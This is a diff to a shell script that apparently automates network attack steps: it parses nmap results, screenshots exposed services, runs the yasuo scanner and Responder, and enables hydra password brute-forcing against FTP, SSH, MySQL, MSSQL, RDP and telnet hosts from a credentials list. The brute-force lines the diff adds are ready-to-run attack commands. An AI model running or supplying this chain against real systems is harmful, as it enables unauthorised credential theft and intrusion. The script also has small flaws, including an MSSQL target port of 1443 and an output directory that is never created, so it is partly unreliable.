@@ -40,8 +40,8 @@ python $HOME/includes/parse_nmap.py -f $SCAN_RESULTS_LOCATION/$NETWORK.xml
 # USE EYE WITNESS HERE.. screesnhot web + vnc + rdp
 cd $HOME/includes/EyeWitness/
 ./EyeWitness.py -x $SCAN_RESULTS_LOCATION/$NETWORK.xml --headless -d $SCAN_RESULTS_LOCATION/EyeWhitnessWeb --no-prompt --active-scan --prepend-https
-./EyeWitness.py -x $SCAN_RESULTS_LOCATION/$NETWORK.xml --rdp -d $SCAN_RESULTS_LOCATION/EyeWhitnessRDP --no-prompt --active-scan --prepend-https
-./EyeWitness.py -x $SCAN_RESULTS_LOCATION/$NETWORK.xml --vnc -d $SCAN_RESULTS_LOCATION/EyeWhitnessVNC --no-prompt --active-scan --prepend-https
+./EyeWitness.py -x $SCAN_RESULTS_LOCATION/$NETWORK.xml --rdp -d $SCAN_RESULTS_LOCATION/EyeWhitnessRDP --no-prompt --active-scan
+./EyeWitness.py -x $SCAN_RESULTS_LOCATION/$NETWORK.xml --vnc -d $SCAN_RESULTS_LOCATION/EyeWhitnessVNC --no-prompt --active-scan
 mkdir -p $SCAN_RESULTS_LOCATION/EyeWhitness
 mv $SCAN_RESULTS_LOCATION/EyeWhitnessWeb $SCAN_RESULTS_LOCATION/EyeWhitnessRDP $SCAN_RESULTS_LOCATION/EyeWhitnessVNC $SCAN_RESULTS_LOCATION/EyeWhitness/
 cd $HOME
@@ -74,25 +74,8 @@ mv smb* $SCAN_RESULTS_LOCATION/smb/
 
 # Yasuo scan
 cd includes/yasuo/
-./yasuo.rb -f $SCAN_RESULTS_LOCATION/$NETWORK.xml -b all > $SCAN_RESULTS_LOCATION/yasuo.txt
+./yasuo.rb -f $SCAN_RESULTS_LOCATION/nmap_results/$NETWORK.xml -b all > $SCAN_RESULTS_LOCATION/yasuo.txt
 cd $HOME
-
-#Open Zenmap
-zenmap $SCAN_RESULTS_LOCATION/nmap_results/$NETWORK.xml & 
-
-#Open results in IceWeasel
-firefox &
-sleep 3
-firefox -new-tab $SCAN_RESULTS_LOCATION/yasuo.txt &
-sleep 2
-firefox -new-tab $SCAN_RESULTS_LOCATION/smb/ &
-sleep 2
-firefox -new-tab $SCAN_RESULTS_LOCATION/EyeWhitness/ &
-sleep 2
-firefox -new-tab $SCAN_RESULTS_LOCATION/enum4linux/ &
-sleep 2
-firefox -new-tab $SCAN_RESULTS_LOCATION/nmap_results/$NETWORK.html &
-sleep 3
 
 #Run Responder
 cd includes/Responder/
@@ -104,13 +87,20 @@ mv * $SCAN_RESULTS_LOCATION/Responder_data/
 firefox -new-tab $SCAN_RESULTS_LOCATION/Responder_data/ &
 sleep 1
 
+#Open Zenmap
+zenmap $SCAN_RESULTS_LOCATION/nmap_results/$NETWORK.xml & 
+
 cd $HOME
 #Brute Force attacks
 #mkdir -p $SCAN_RESULTS_LOCATION/bruteforced_creds
-#hydra -C $HOME/users+password.txt -M $SCAN_RESULTS_LOCATION/Parsed_Nmap_Results/Port-Files/23-TCP.txt telnet -t4 -o $SCAN_RESULTS_LOCATION/bruteforced_creds/telnet.txt
-#hydra -C $HOME/users+password.txt -M $SCAN_RESULTS_LOCATION/Parsed_Nmap_Results/Port-Files/21-TCP.txt ftp -t4 -o $SCAN_RESULTS_LOCATION/bruteforced_creds/ftp.txt
-#hydra -C $HOME/users+password.txt -M $SCAN_RESULTS_LOCATION/Parsed_Nmap_Results/Port-Files/3389-TCP.txt rdp -t2 -W16 -o $SCAN_RESULTS_LOCATION/bruteforced_creds/rdp.txt
-#hydra -C $HOME/users+password.txt -M $SCAN_RESULTS_LOCATION/Parsed_Nmap_Results/Port-Files/22-TCP.txt ssh -t4 -o $SCAN_RESULTS_LOCATION/bruteforced_creds/ssh.txt
+hydra -C $HOME/users+password.txt -M $SCAN_RESULTS_LOCATION/Parsed_Nmap_Results/Port-Files/21-TCP.txt ftp -t1 -o $SCAN_RESULTS_LOCATION/bruteforced_creds/ftp.txt
+hydra -C $HOME/users+password.txt -M $SCAN_RESULTS_LOCATION/Parsed_Nmap_Results/Port-Files/22-TCP.txt ssh -t1 -o $SCAN_RESULTS_LOCATION/bruteforced_creds/ssh.txt
+hydra -C $HOME/users+password.txt -M $SCAN_RESULTS_LOCATION/Parsed_Nmap_Results/Port-Files/3306-TCP.txt mysql -t1 -o $SCAN_RESULTS_LOCATION/bruteforced_creds/mysql.txt
+hydra -C $HOME/users+password.txt -M $SCAN_RESULTS_LOCATION/Parsed_Nmap_Results/Port-Files/1443-TCP.txt mssql -t1 -o $SCAN_RESULTS_LOCATION/bruteforced_creds/mssql.txt
+hydra -C $HOME/users+password.txt -M $SCAN_RESULTS_LOCATION/Parsed_Nmap_Results/Port-Files/3389-TCP.txt rdp -t1 -o $SCAN_RESULTS_LOCATION/bruteforced_creds/rdp.txt
+hydra -C $HOME/users+password.txt -M $SCAN_RESULTS_LOCATION/Parsed_Nmap_Results/Port-Files/23-TCP.txt telnet -t1 -o $SCAN_RESULTS_LOCATION/bruteforced_creds/telnet.txt
 
-#iceweasel -new-tab $SCAN_RESULTS_LOCATION/bruteforced_creds/ &
-#sleep 1
+#Open results in IceWeasel
+firefox &
+sleep 3
+firefox -new-tab $SCAN_RESULTS_LOCATION/ &
